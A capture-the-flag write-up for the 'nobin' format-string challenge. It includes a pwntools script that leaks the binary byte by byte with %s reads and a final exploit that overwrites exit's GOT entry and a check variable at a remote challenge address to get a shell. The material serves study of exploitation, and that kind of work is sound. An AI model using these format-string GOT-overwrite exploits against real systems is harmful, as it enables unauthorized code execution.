# nobin

###### This challenge is about formatstrings. However you have nothing except the server connection. 
If you send a few ```%p```'s, you see that the challenge has aslr, but no pie. That means you are able to leak the binary
with the formatstring ```%s```. There are many way's to do that, but I used python pwntools for my leak programm:
```python
from pwn import *

addr = 0x400000

while(addr != 0x400a00):
  p = process("./nobin")
  f = open("./leaked", "a")
  print("addr: " + str(hex(addr)))
  p.sendline("%7$sBBBB" + p64(addr))
  leak = p.recv().split("B")
  if(leak[0] == ""):
      f.write("\x00")
      addr += 1
  else:
      f.write(leak[0])
      addr += len(leak[0])
  p.close()
  f.close()

addr = 0x400a00

while(addr != 0x400b00):
  p = process("./nobin")
  f = open("./leaked", "a")
  print("addr: " + str(hex(addr)))
  f.write("\x00")
  addr += 1
  p.close()
  f.close()

addr = 0x400b00

while(addr != 0x600000):
  p = process("./nobin")
  f = open("./leaked", "a")
  print("addr: " + str(hex(addr)))
  p.sendline("%7$sBBBB" + p64(addr))
  leak = p.recv().split("B")
  if(leak[0] == ""):
      f.write("\x00")
      addr += 1
  else:
      f.write(leak[0])
      addr += len(leak[0])
  p.close()
  f.close()

addr = 0x600000

while(addr != 0x602000):
  p = process("./nobin")
  f = open("./leaked", "a")
  print("addr: " + str(hex(addr)))
  p.sendline("%7$sBBBB" + p64(addr))
  leak = p.recv().split("B")
  if(leak[0] == ""):
      f.write("\x00")
      addr += 1
  else:
      f.write(leak[0])
      addr += len(leak[0])

  p.close()
  f.close()

p.interactive()
```
###### This programm will leak the whole binary. Just run the script and wait.
#
If you are finished, you can take a look at the binary in a debugger or decompiler. You will find a function
(at ```0x40081a```) with the string "/bin/sh" moved into rdi. After that a function is called. It seems like
```system()```. So now we need to write to an address to call this system. So why not into the got of the
last function call in main (at ```0x400757```). It could be exit. So lets try that. If we do that, we get a message
**not that easy**. So if we look at the disassembly, we see that an address is compared with ```0x1337```. So we
have to write to that address (```0x60108c```) too. But we have only one read and printf, so we have to
overwrite ```exit()``` with ```main()```, then write to the address and lastly overwrite ```exit()``` (at ```0x601048```)
with ```0x40081a```. So here's the exploit:

```python
from pwn import *

p = remote("34.121.19.183", 49156)

exit_got = 0x601048
var = 0x60108c

p.sendline("%9$1879p%9$hnAAAAAAAAAAA" + p64(exit_got))
p.sendline("%9$4919p%9$hnAAAAAAAAAAA" + p64(var))
p.sendline("%9$2074p%9$hnAAAAAAAAAAA" + p64(exit_got))
p.interactive()
```
###### And we get a shell! Nice!
